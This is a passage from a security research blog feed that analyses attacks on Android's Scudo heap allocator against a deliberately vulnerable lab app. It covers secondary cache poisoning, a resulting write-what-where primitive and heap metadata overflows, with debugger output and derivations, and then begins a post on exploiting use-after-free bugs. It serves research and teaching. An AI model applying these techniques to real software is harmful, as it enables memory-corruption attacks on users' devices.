&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> i r rdi
rdi &lt;span style="color:#ae81ff">0x80000&lt;/span> &lt;span style="color:#ae81ff">0x80000&lt;/span>
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> ni
...
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> i r rax
rax &lt;span style="color:#ae81ff">0x7babf2940830&lt;/span> &lt;span style="color:#ae81ff">0x7babf2940830&lt;/span>
gef&lt;span style="color:#960050;background-color:#1e0010">➤&lt;/span> x&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>gx &lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>rax&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x40&lt;/span>
&lt;span style="color:#ae81ff">0x7babf29407f0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x00007bac40c76fc0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000000000&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940800&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x00007babf29407f0&lt;/span> &lt;span style="color:#ae81ff">0x0000000000080040&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940810&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span> &lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>
&lt;span style="color:#ae81ff">0x7babf2940820&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0x216a000000000100&lt;/span> &lt;span style="color:#ae81ff">0x4242424242424242&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As can be seen from the fields &lt;code>LargeBlock::Header::MapBase = -1&lt;/code> and &lt;code>LargeBlock::Header::MapSize = -1&lt;/code>, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=542;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>mmap&lt;/code>&lt;/a> returned &lt;code>-1&lt;/code>, which is not a valid user - space address on Android. Also observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=210;drc=b45a2ea782074944f79fc388df20b06e01f265f7">the last cached large chunk is retrieved first&lt;/a>. Hence, if we called &lt;code>malloc&lt;/code> next, then our fake chunk would be considered first!&lt;/p>
&lt;p>Still, there is something off:&lt;/p>
&lt;ol>
&lt;li>&lt;code>LargeBlock::Header::Prev = 0x00007bac40c76fc0&lt;/code>, which is not our chunk.&lt;/li>
&lt;li>&lt;code>LargeBlock::Header::Next = 0x0000000000000000&lt;/code>, so its the last element in &lt;code>InUseChunks&lt;/code>&lt;/li>
&lt;li>&lt;code>LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>, where &lt;code>0x7babf29407b0&lt;/code> was the address of the large header before calling &lt;code>free&lt;/code>. But we can see that the &lt;code>CommitBase&lt;/code> remained the same and also that the newly &amp;ldquo;allocated&amp;rdquo; chunk is now located at &lt;code>0x00007babf29407f0&lt;/code>, which is the &lt;code>CommitBase&lt;/code> value of our fake chunk (technically, this could be a coincidence, because &lt;code>0x7babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our &lt;code>buffer&lt;/code>).&lt;/li>
&lt;/ol>
&lt;p>As is the case with &lt;a href="#primary-poisoning">primary poisoning&lt;/a>, the contents have not been cleared:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ x/4gx $rax
0x7babf2940830: 0x4242424242424242 0x4242424242424242
0x7babf2940840: 0x4242424242424242 0x4242424242424242
&lt;/code>&lt;/pre>&lt;p>which again allows for distinguishing fake chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of &lt;code>0x40&lt;/code> into account (we will see why the shift is there later).&lt;/p>
&lt;h5 id="challenges">Challenges&lt;/h5>
&lt;p>Similar to &lt;a href="#primary-poisoning">primary poisoning&lt;/a>, there are some pitfalls with &lt;a href="#secondary-cache-poisoning">secondary cache poisoning&lt;/a>, which will be discussed in this section.&lt;/p>
&lt;h6 id="one-secondary-to-rule-em-all">One Secondary to rule &amp;lsquo;em all&lt;/h6>
&lt;p>Observe that when allocating memory from the secondary via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>malloc(&amp;lt;large size&amp;gt;)&lt;/code>&lt;/a>, there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may &amp;ldquo;change&amp;rdquo; depending on the outcome of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>getTSDAndLock&lt;/code>&lt;/a>. Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=992;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>Primary&lt;/code>&lt;/a> is not used for any allocations directly).&lt;/p>
&lt;p>Considering the empirical observation that the &lt;em>damnvulnerableapp:VulnerableActivity&lt;/em> averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ i threads
Id Target Id Frame
1 Thread 16516.16516 &amp;quot;nerableActivity&amp;quot; 0x00007baef80269aa in __epoll_pwait () from libc.so
6 Thread 16516.16521 &amp;quot;Signal Catcher&amp;quot; 0x00007baef80263ea in __rt_sigtimedwait () from libc.so
7 Thread 16516.16522 &amp;quot;perfetto_hprof_&amp;quot; 0x00007baef8025747 in read () from libc.so
8 Thread 16516.16523 &amp;quot;ADB-JDWP Connec&amp;quot; 0x00007baef8026aaa in __ppoll () from libc.so
9 Thread 16516.16524 &amp;quot;Jit thread pool&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
10 Thread 16516.16525 &amp;quot;HeapTaskDaemon&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
11 Thread 16516.16526 &amp;quot;ReferenceQueueD&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
12 Thread 16516.16527 &amp;quot;FinalizerDaemon&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
13 Thread 16516.16528 &amp;quot;FinalizerWatchd&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
14 Thread 16516.16529 &amp;quot;Binder:16516_1&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
15 Thread 16516.16530 &amp;quot;Binder:16516_2&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
16 Thread 16516.16533 &amp;quot;Binder:16516_3&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
17 Thread 16516.16538 &amp;quot;Profile Saver&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
18 Thread 16516.16539 &amp;quot;RenderThread&amp;quot; 0x00007baef80269aa in __epoll_pwait () from libc.so
19 Thread 16516.16542 &amp;quot;pool-2-thread-1&amp;quot; 0x00007baef8026aaa in __ppoll () from libc.so
20 Thread 16516.16544 &amp;quot;hwuiTask0&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
21 Thread 16516.16545 &amp;quot;hwuiTask1&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
22 Thread 16516.16546 &amp;quot;Binder:16516_3&amp;quot; 0x00007baef7fcddf8 in syscall () from libc.so
23 Thread 16516.16547 &amp;quot;Thread-3&amp;quot; 0x00007baef802656a in recvfrom () from libc.so
* 24 Thread 16516.16548 &amp;quot;Thread-2&amp;quot; 0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so
25 Thread 16516.16562 &amp;quot;Binder:16516_4&amp;quot; 0x00007baef80259e7 in __ioctl () from libc.so
&lt;/code>&lt;/pre>&lt;p>As with the &lt;a href="#thievish-threads">primary&lt;/a>, our fake chunk may be stolen by another thread, depending on the allocations performed.&lt;/p>
&lt;p>Another problem is that if the cache is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=202;drc=b45a2ea782074944f79fc388df20b06e01f265f7">full&lt;/a> and there are &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=203;drc=b45a2ea782074944f79fc388df20b06e01f265f7">not &amp;ldquo;enough&amp;rdquo; (4) allocations&lt;/a> happening to balance out the congestion of the cache, the cache will be &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=221;drc=b45a2ea782074944f79fc388df20b06e01f265f7">emptied&lt;/a>. This basically &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=357;drc=b45a2ea782074944f79fc388df20b06e01f265f7">invalidates all cache entries&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=364;drc=b45a2ea782074944f79fc388df20b06e01f265f7">unmaps&lt;/a> them. Having &lt;code>munmap&lt;/code> called on our fake chunk might seem problematic, but it turns out that running &lt;code>munmap(0x0, 0x1)&lt;/code> returns successfully&amp;hellip;Therefore, setting &lt;code>LargeBlock::Header::MapBase = 0&lt;/code> and &lt;code>LargeBlock::Header::MapSize = 1&lt;/code> at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack.&lt;/p>
&lt;p>To conclude, &lt;strong>Secondary Cache Poisoning is probabilistic&lt;/strong> just like &lt;a href="#pitfalls-and-challenges">Primary Poisoning&lt;/a>!&lt;/p>
&lt;h6 id="shifted-user-data">Shifted User Data&lt;/h6>
&lt;p>Recall that our fake chunk returned from calling &lt;code>malloc&lt;/code> is located at &lt;code>fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40&lt;/code>. Therefore, the user data starts at &lt;code>0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830&lt;/code>, because of the headers and padding (see example above). At best, we want to show that &lt;code>malloc(size) = fake.CommitBase + 0x40&lt;/code>, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to &lt;a href="#fake-chunk-mispositioning">primary chunks&lt;/a>, because the &lt;code>LargeBlock::Header::CommitBase&lt;/code> is not compacted!&lt;/p>
&lt;p>Lets say we successfully called &lt;code>free(buffer + 0x40)&lt;/code> and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to &lt;code>malloc(fake.CommitSize - 0x40)&lt;/code> returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that &lt;code>0x10 | fake.CommitBase&lt;/code> and &lt;code>0x10 | fake.CommitSize&lt;/code> (i.e. everything is nicely aligned). We want to prove that these assumptions imply that &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code>.&lt;/p>
&lt;p>First, observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>MapAllocatorCache::store&lt;/code>&lt;/a> does not change &lt;code>fake.CommitBase&lt;/code> and &lt;code>fake.CommitSize&lt;/code>. To that end, notice that all accesses to &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=155;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Entry.CommitBase&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Entry.CommitSize&lt;/code>&lt;/a>, are by value and &lt;strong>not&lt;/strong> by reference. Thus, the actual cache entry will contain our chosen &lt;code>fake.CommitBase&lt;/code> and &lt;code>fake.CommitSize&lt;/code>.&lt;/p>
&lt;p>When allocating from the secondary cache, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>retrieve&lt;/code>&lt;/a> is called. Based on the assumption that &lt;code>malloc(fake.CommitSize - 0x40)&lt;/code> returns our fake chunk if available, we need to show that&lt;/p>
&lt;ol>
&lt;li>the sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned.&lt;/li>
&lt;li>the &lt;code>CommitBase&lt;/code> is somehow modified by a constant.&lt;/li>
&lt;/ol>
&lt;p>For the first point, observe that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>Secondary.deallocate&lt;/code>&lt;/a> is given the allocation size that is passed to &lt;code>malloc&lt;/code>. Therefore, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=514;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>MapAllocatorCache::retrieve&lt;/code>&lt;/a> is called with &lt;code>Size = fake.CommitSize - 0x40&lt;/code>. We also know that &lt;code>fake_entry.CommitSize = fake.CommitSize&lt;/code> (we will call the entry representing our fake chunk &lt;code>fake_entry&lt;/code>). Hence &lt;code>CommitBase := fake_entry.CommitBase&lt;/code> and &lt;code>CommitSize := fake_entry.CommitSize&lt;/code>. Then it has to hold that&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=249;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos &amp;gt; CommitBase + CommitSize&lt;/code>&lt;/a>. This is computed in the following:
&lt;pre tabindex="0">&lt;code>AllocPos = roundDownTo(CommitBase + CommitSize - Size, Alignment)
= roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment)
= roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment)
= roundDownTo(CommitBase + 0x40), Alignment) &amp;lt;-- assumption on 0x10 divides CommitBase
= CommitBase + 0x40
HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize();
= (CommitBase + 0x40) - 0x10 - 0x30
= CommitBase
&lt;/code>&lt;/pre>Therefore, we check whether &lt;code>CommitBase &amp;gt; CommitBase + CommitSize &amp;lt;=&amp;gt; 0 &amp;gt; CommitSize&lt;/code>, which is impossible, as &lt;code>CommitSize&lt;/code> is of type &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/internal_defs.h;l=81;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>uptr = uintptr_t&lt;/code>&lt;/a>. To be precise, an unsigned comparison will be performed, i.e. for &lt;code>r13 = AllocPos&lt;/code> and &lt;code>rsi = CommitBase + CommitSize&lt;/code>:
&lt;pre tabindex="0">&lt;code>0x00007baef7fc0dc6 &amp;lt;+182&amp;gt;: add r13,0xffffffffffffffc0 // HeaderPos = AllocPos - 0x40
0x00007baef7fc0dca &amp;lt;+186&amp;gt;: cmp r13,rsi // CommitBase - (CommitBase + CommitSize) = -CommitSize
0x00007baef7fc0dcd &amp;lt;+189&amp;gt;: ja 0x7baef7fc0d80 // jump if CF=0 and ZF=0; we DONT want to jump here
&lt;/code>&lt;/pre>For the above, &lt;code>CF=1&lt;/code> as mathematically &lt;code>CommitSize &amp;gt;= 0&lt;/code>. Hence, the fake chunk passes the first check.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=251;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos &amp;lt; CommitBase || AllocPos &amp;gt; CommitBase + PageSize * MaxUnusedCachePages&lt;/code>&lt;/a>:
&lt;ol>
&lt;li>&lt;code>HeaderPos &amp;lt; CommitBase &amp;lt;=&amp;gt; CommitBase &amp;lt; CommitBase&lt;/code> is trivially false.&lt;/li>
&lt;li>The second condition requires a bit more math:
&lt;pre tabindex="0">&lt;code> AllocPos = CommitBase + 0x40
&amp;gt; CommitBase + PageSize * MaxUnusedCachePages
&amp;lt;=&amp;gt; 0x40 &amp;gt; 0x1000 * 4
&lt;/code>&lt;/pre>which is trivially false.&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7">assignment phase&lt;/a>. Luckily, this phase does not modify &lt;code>fake_entry.CommitBase&lt;/code> and &lt;code>fake_entry.CommitSize&lt;/code> at all. Notice that the pointer to the header that &lt;code>MapAllocatorCache::retrieve&lt;/code> returns is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>HeaderPos&lt;/code>&lt;/a>, i.e. &lt;code>CommitBase&lt;/code>.&lt;/p>
&lt;p>Finally, the user data pointer will be computed &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=515;drc=b45a2ea782074944f79fc388df20b06e01f265f7">here&lt;/a> (extremely simplified):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">return&lt;/span> H &lt;span style="color:#f92672">+&lt;/span> LargeBlock&lt;span style="color:#f92672">::&lt;/span>getHeaderSize(); &lt;span style="color:#75715e">// = fake.CommitBase + 0x30
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is then used to compute the final user pointer &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=379">&lt;code>Ptr = fake.CommitBase + 0x30 + 0x10&lt;/code>&lt;/a> (again extremely simplified, but this is what actually happens when resolving alignment etc.).&lt;/p>
&lt;p>Therefore, &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code> (btw. this is totally a &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>).&lt;/p>
&lt;h5 id="neat-little-side-effect">Neat Little Side Effect&lt;/h5>
&lt;p>The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting &lt;code>fake.CommitBase&lt;/code> accordingly.&lt;/p>
&lt;p>Theoretically speaking, let &lt;code>target_addr&lt;/code> be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, &lt;code>munmap&lt;/code> will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!&lt;/p>
&lt;p>From &lt;code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40&lt;/code> we get that the &lt;code>LargeBlock::Header&lt;/code> is stored at a chosen &lt;code>fake.CommitBase&lt;/code>. As we cannot control the contents of &lt;code>fake.Prev&lt;/code> and &lt;code>fake.Next&lt;/code>, because they will be overwritten, we have to stick with &lt;code>fake.MapBase&lt;/code> and &lt;code>fake.MapSize&lt;/code>. It should also be possible to use the &lt;code>fake.CommitSize&lt;/code> field, but we will ignore it for now, because it will be modified by a &lt;code>+ 0x40&lt;/code>, which has to be considered when calling &lt;code>free&lt;/code> in order to bypass the checks.&lt;/p>
&lt;p>Now, choosing &lt;code>fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20&lt;/code> results in a 16 byte write at &lt;code>target_addr&lt;/code>. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this &lt;em>Write - What - Where&lt;/em> condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.&lt;/p>
&lt;h3 id="heap---based-meta-data-overflow">Heap - based Meta Data Overflow&lt;/h3>
&lt;p>Up to this point, we have only seen fake chunk creation for &lt;a href="#primary-poisoning">primary&lt;/a> and &lt;a href="#secondary-cache-poisoning">secondary&lt;/a> and a small &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>. Now one might ask: What if there is a buffer overflow into a consecutive chunk?&lt;/p>
&lt;p>First, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via &lt;code>mmap&lt;/code> and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=388;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">shuffles&lt;/a> the chunks w.r.t. a class id. This means that for some index &lt;code>i&lt;/code> we get that with high probability &lt;code>malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20&lt;/code>.&lt;/p>
&lt;p>This leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as &lt;a href="#future-work">future work&lt;/a>.&lt;/p>
&lt;p>Lets assume that we introduced two fake chunks, named &lt;code>first&lt;/code> and &lt;code>second&lt;/code>, with the following properties:&lt;/p>
&lt;ol>
&lt;li>the fake chunks are of the same size (primary)&lt;/li>
&lt;li>there exists an index &lt;code>i&lt;/code> s.t. &lt;code>C-&amp;gt;Chunks[i] = first&lt;/code> and &lt;code>C-&amp;gt;Chunks[i+1] = second&lt;/code>&lt;/li>
&lt;li>there is no interference by other threads&lt;/li>
&lt;li>&lt;code>first&lt;/code> and &lt;code>second&lt;/code> are successive in memory, i.e. &lt;code>addr(first) + 0x20 = addr(second)&lt;/code>&lt;/li>
&lt;li>there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from &lt;code>first&lt;/code> into &lt;code>second&lt;/code>, and &lt;code>second&lt;/code> contains &amp;ldquo;important&amp;rdquo; information&lt;/li>
&lt;/ol>
&lt;p>To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating &lt;code>first&lt;/code> until it allocates &lt;code>second&lt;/code>, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.&lt;/p>
&lt;p>Assuming the above properties, the remaining issue is that overwriting meta data of &lt;code>second&lt;/code> in &lt;em>Scudo&lt;/em> will abort the app if &lt;code>free(second)&lt;/code> is called and there is a checksum mismatch. Therefore, we need to know the pointer of &lt;code>second&lt;/code> and &lt;strong>a&lt;/strong> value for &lt;code>Cookie&lt;/code> in order to properly compute the checksum. If, however, the goal is to get the overflow into &amp;ldquo;important&amp;rdquo; user data (which might even allow to overwrite the &lt;code>.got&lt;/code> entry of &lt;code>free&lt;/code>), then an attacker will be allowed to overflow with the above assumptions.&lt;/p>
&lt;h2 id="future-work">Future Work&lt;/h2>
&lt;p>In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered &amp;ldquo;useless&amp;rdquo; at that point in time.&lt;/p>
&lt;ol>
&lt;li>Evaluate integer underflow in &lt;a href="#fake-chunk-mispositioning">primary poisoning&lt;/a>. It somehow feels like there has to be more that can be done&amp;hellip;&lt;/li>
&lt;li>Evaluate &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1116;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>getBlockBegin&lt;/code>&lt;/a>. To be precise: how can the &lt;code>Offset&lt;/code> field be used? Memory probing??&lt;/li>
&lt;li>Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling &lt;code>free&lt;/code> repeatedly for consecutive memory allows to fill up &lt;code>C-&amp;gt;Chunks&lt;/code> in non - shuffled fashion! Problem: strong assumptions&lt;/li>
&lt;li>Evaluate integer underflow caused by calling &lt;code>DoublyLinkedList::remove&lt;/code> with &lt;code>X-&amp;gt;Next = X-&amp;gt;Prev = X&lt;/code>. Maybe side channel?? (very unlikely, but would be funny). &lt;code>DoublyLinkedList::Size&lt;/code> impacts &lt;code>DoublyLinkedList::empty()&lt;/code>, which impacts &lt;code>scudo_malloc_info&lt;/code>. Might be useful to confuse programs&amp;hellip;&lt;/li>
&lt;li>What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks?&lt;/li>
&lt;li>It seems to be possible to render the secondary cache useless by freeing fake chunks with &lt;code>CommitSize = &amp;lt;size smaller than primary sizes&amp;gt;&lt;/code> and &lt;code>CommitBase != nullptr&lt;/code>, as we &lt;strong>dont&lt;/strong> have control over the &lt;code>ClassId&lt;/code> field for &lt;code>scudo_malloc&lt;/code> calls. This could enforce secondary allocations to use &lt;code>mmap&lt;/code> and &lt;code>munmap&lt;/code>. This might be limited by the fact that the cache can be emptied if it is full.&lt;/li>
&lt;li>Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to &lt;code>malloc&lt;/code> result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to &lt;code>malloc&lt;/code> return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of &lt;code>malloc&lt;/code> and &lt;code>free&lt;/code> calls to &amp;ldquo;shuffle&amp;rdquo; the array. Then repeat.&lt;/li>
&lt;/ol>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>We have seen different kinds of attacks on vulnerabilities that involve &lt;em>Scudo&lt;/em>. To be precise, we have seen two types of fake chunk creation, namely &lt;a href="#primary-poisoning">&lt;em>Primary Poisoning&lt;/em>&lt;/a> and &lt;a href="#secondary-cache-poisoning">&lt;em>Secondary Cache Poisoning&lt;/em>&lt;/a>, as well as a &lt;a href="#neat-little-side-effect">&lt;em>Write - What - Where&lt;/em> condition&lt;/a>, which was a side effect of &lt;em>Secondary Cache Poisoning&lt;/em>. Finally, heap overflows into chunk meta data have been discussed.&lt;/p>
&lt;p>Overall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a &lt;em>Scudo&lt;/em> - related vulnerability, we can perform similar attacks to those applicable to e.g. &lt;em>dlmalloc&lt;/em>. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.&lt;/p></content></item><item><title>E²VA: Use After Free Write/Execute Module (Part 4)</title><link>https://lolcads.github.io/posts/2024/07/eva_3/</link><pubDate>Wed, 24 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/eva_3/</guid><description>Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition.</description><content>&lt;h1 id="exploitation-of-use---after---free-modules">Exploitation of &lt;em>Use - After - Free&lt;/em> Modules&lt;/h1>
&lt;p>In this post we will be discussing how to exploit a &lt;em>Use - After - Free&lt;/em> bug in both &lt;em>UseAfterFreeExecModule&lt;/em> and &lt;em>UseAfterFreeWriteModule&lt;/em>. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in &lt;em>UseAfterFreeExecModule&lt;/em> we will be able to control a function pointer, whereas in &lt;em>UseAfterFreeWriteModule&lt;/em> we are given a &lt;em>Write - What - Where&lt;/em> condition.&lt;/p>
&lt;h2 id="about-this-post">About this post&lt;/h2>
&lt;p>Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about &lt;strong>failing&lt;/strong> to exploit the &lt;em>Use - After - Free&lt;/em> bug that enables a &lt;em>Write - What - Where&lt;/em> condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the &lt;em>UseAfterFreeWriteModule&lt;/em>, but it was too hard to start with, so I introduced &lt;em>UseAfterFreeExecModule&lt;/em> and derived a technique that is applicable to both modules.&lt;/p>
&lt;p>If you are not interested in reading about one of the core pillars of binary exploitation, i.e. &lt;strong>failure&lt;/strong>, then feel free to skip to the &lt;a href="#coming-back-from-useafterfreeexecmodule">fun part&lt;/a> :)&lt;/p>
